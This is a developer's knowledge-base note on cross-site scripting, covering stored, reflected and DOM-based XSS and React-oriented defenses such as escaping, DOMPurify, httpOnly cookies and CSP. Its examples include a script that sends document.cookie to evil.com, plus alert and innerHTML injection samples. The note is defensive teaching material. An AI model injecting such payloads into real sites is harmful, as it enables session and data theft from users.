---
created: 2026-04-07
tags: [security, xss, injection]
related: [ [[Frontend security MOC]], [[Content Security Policy (CSP)]] ]
status: active
---

# XSS protection

**Cross-Site Scripting (XSS)** is a class of attacks where a malicious actor injects executable scripts into a web page viewed by other users. If successful, the attacker's script runs with the same privileges as your application — it can steal cookies, session tokens, and user data.

## Types of XSS

### 1. Stored XSS (Persistent)
Malicious script is saved to the database (e.g., in a comment field) and executed for every user who views it.
- **Example**: User submits `<script>fetch('https://evil.com?c='+document.cookie)</script>` as a comment.

### 2. Reflected XSS
The malicious script is embedded in a URL and reflected back by the server in the response.
- **Example**: `https://yourapp.com/search?q=<script>alert(1)</script>`

### 3. DOM-Based XSS
The attack happens entirely in the browser using unsafe JavaScript that writes user-controlled data directly to the DOM.
- **Example**: `document.getElementById('output').innerHTML = location.hash;`

---

## Prevention Strategies

### 1. Never Use `innerHTML` with User Data (React)
React's JSX escapes all strings by default — this is its most important security feature.

```tsx
// ✅ Safe — React escapes the string, renders it as text
const userInput = "<script>alert('xss')</script>";
return <p>{userInput}</p>;
// Renders: <p>&lt;script&gt;alert('xss')&lt;/script&gt;</p>

// ❌ DANGEROUS — bypasses React's escaping
return <p dangerouslySetInnerHTML={{ __html: userInput }} />;
```

If you must render rich HTML (e.g., a blog post from a CMS), always sanitize it first:

```tsx
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyHtmlFromCMS);
return <div dangerouslySetInnerHTML={{ __html: clean }} />;
```

### 2. Sanitize on Input AND Output
- **Input**: Strip or encode dangerous characters when the user submits data.
- **Output**: Encode data when rendering it to the page. Never trust data from any external source.

### 3. Use `httpOnly` Cookies for Auth Tokens
If your session token is in `localStorage`, any XSS attack can steal it with `document.cookie` or `localStorage.getItem(...)`. An `httpOnly` cookie is invisible to JavaScript.

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 4. Content Security Policy (CSP)
Your last line of defense — even if an XSS injection occurs, the CSP can block the injected script from executing. See [[Content Security Policy (CSP)]].

---

## Quick Reference

| Practice | Prevents |
|---|---|
| React JSX (default escaping) | DOM-based and reflected XSS |
| DOMPurify for raw HTML | Stored XSS in rich content |
| `httpOnly` cookies | Token theft via XSS |
| CSP header | Script execution even if injected |
| Avoid `eval()`, `new Function()` | Code injection vectors |

---

## Related Topics
- [[Frontend security MOC]]
- [[Content Security Policy (CSP)]]
- [[Session vs JWT authentication]]
